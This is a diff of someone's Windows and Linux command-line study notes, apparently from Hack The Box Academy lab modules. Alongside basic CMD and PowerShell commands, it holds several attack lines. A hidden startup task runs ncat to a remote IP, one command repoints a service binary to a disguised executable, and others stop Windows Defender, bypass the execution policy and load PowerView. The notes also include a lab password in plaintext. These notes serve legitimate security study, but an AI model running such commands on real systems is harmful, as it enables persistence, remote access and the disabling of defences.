@@ -1,12 +1,21 @@
 # Linux
 
-# Windows
+```bash
+smbclient -L SERVER_IP -U htb-student
+smbclient '\\SERVER_IP\Company Data' -U htb-student
+sudo mount -t cifs -o username=htb-student,password=Academy_WinFun! //ipaddoftarget/"Company Data" /home/user/Desktop/
+sudo apt-get install cifs-utils
+
+
+```
+
+# Windows TODO: Priv Escalation, Attack and Defense, Event Logs and Finding Evil, Intro to AD, File Transfers Windows File Transfer Methods, Detecting Windows Attacks w/ Splunk, AD enum + attacks
 
 ## CMD Line, Fundamentals
 
 ### CMD
 
-```cmd
+```bat
 ssh htb-student@<IP-Address>
 
 doskey /history
@@ -22,6 +31,11 @@ cd C:\User\htb\Pictures
 cd ..\..\..\..\
 cd .\Pictures
 
+icacls c:\windows
+icacls c:\Users
+icacls c:\users /grant joe:f
+
+
 whoami
 whoami /groups
 whoami /priv
@@ -33,6 +47,8 @@ new view
 systeminfo
 hostname
 ver
+
+sc qc quauserv
 sc query type= service
 sc stop windefend
 sc query Spooler
@@ -40,10 +56,14 @@ sc stop Spooler
 sc start Spooler
 sc query wuaserv
 sc query bits
-sc onfig wuaserv start=disabled
+sc config wuaserv start=disabled
+sc config wuauserv binPath=C:\Winbows\Perfectlylegitprogram.exe
+sc sdshow wuauserv
+
 tasklist /svc
 net start
 wmic service list brief
+wmic os list brief
 
 SCHTASKS /Query /V /FO list
 schtasks /create /sc ONSTART /tn "My Secret Task" /tr "C:\Users\Victim\AppData\Local\ncat.exe 172.16.1.100 8100"
@@ -59,6 +79,7 @@ where /R C:\Users\student\ *.csv
 
 tree 
 tree /F
+tree c:\ /f | more
 
 dir /A:R
 dir /A:H
@@ -110,11 +131,29 @@ cd C:\Users\student\Documents\Backup && echo 'did this work' > yes.txt
 del file-1
 erase file-3 file-3
 del /A:R
+
+xfreerdp /v:<targetIp> /u:htb-student /p:Password
 ```
 
-### PS TODO: 
+### PS
 
 ```powershell
+
+uname -a
+whoami /user
+gci -Hidden
+
+HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run
+HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
+HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce
+HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce
+reg query HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run
+reg query HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
+
+Get-WmiObject -Class win32_OperatingSystem | select Version,BuildNumber
+
+
+
 Get-Help Test-Wsman
 Update-Help
 Get-Location
@@ -126,8 +165,15 @@ Get-Command
 Get-Command -verb get
 Get-Command -noun windows*
 Get-History
+
 Get-Alias
 Set-Alias -Name gh -Value Get-Help
+New-Alias -Name "Show-Files" Get-ChildItem
+Get-Alias -Name "Show-Files"
+
+.\PowerView.ps1;Get-LocalGroup |fl
+
+
 Get-ChildItem $PSScriptRoot | ? { $_.PSIsContainer -and !('Tests','docs' -contains $_.Name) } | % { Import-Module $_.FullName -DisableNameChecking }
 Get-Module
 Get-Module -ListAvailable
@@ -138,6 +184,7 @@ $env:PSModulePath
 Get-ExecutionPolicy
 Set-ExecutionPolicy undefined
 Set-ExecutionPolicy -scope Process
+Set-ExecutionPolicy Bypass -Scope Process
 Get-ExecutionPolicy -list
 Get-Command -Module Powersploit
 Get-Command -Module PowerShellGet
@@ -164,6 +211,7 @@ new-Item "Readme.md" -ItemType File
 Add-Content .\Readme.md "Title: Insert Document Title Here"
 Rename-Item .\Cyber-Sec-draft.md -NewName Infosec-SOP-draft.md
 get-childitem -Path *.txt | rename-item -NewName {$_.name -replace ".txt",".md"}
+
 Get-Help *-Service
 Get-Service | ft DisplayName,Status
 Get-Service | measure
@@ -177,7 +225,13 @@ Set-Service -Name Spooler -StartType Disabled
 Get-Service -Name Spooler | Slect-Object -Property StartType
 get-service -ComputerName ACADEMY-ICL-DC
 Get-Service -ComputerName ACADEMY-ICL-DC | Where-Object {$_.Status -eq "Running"}
+ Get-Service | ? {$_.Status -eq "Running"} | select -First 2 |fl
+\\live.sysinternals.com\tools\procdump.exe -accepteula
+Get-ACL -Path HKLM:\System\CurrentControlSet\Services\wuauserv | Format-List
+
+
 Invoke-Command -ComputerName ACADEMY-ICL-DC,LOCALHOST -ScriptBlock {Get-Service -Name 'windefend'}
+
 Get-ChildItem C:\Windows\System32\config\
 Get-Item -Path Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run | Select-Object -ExpandProperty Property
 Get-ChildItem -Path HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion -Recurse
@@ -260,8 +314,9 @@ function Get-Recon {
   }
 Export-ModuleMember
 Export-ModuleMember -Function Get-Recon -Variable Hostname
- Import-Module 'C:\Users\MTanaka\Documents\WindowsPowerShell\Modules\quick-recon.psm1`
- get-module
- 
+Import-Module 'C:\Users\MTanaka\Documents\WindowsPowerShell\Modules\quick-recon.psm1'
+get-module
+
+Invoke-WmiMethod -Path "CIM_DataFile.Name='C:\users\public\spns.csv'" -Name Rename -ArgumentList "C:\Users\Public\kerberoasted_users.csv"
 
 ```
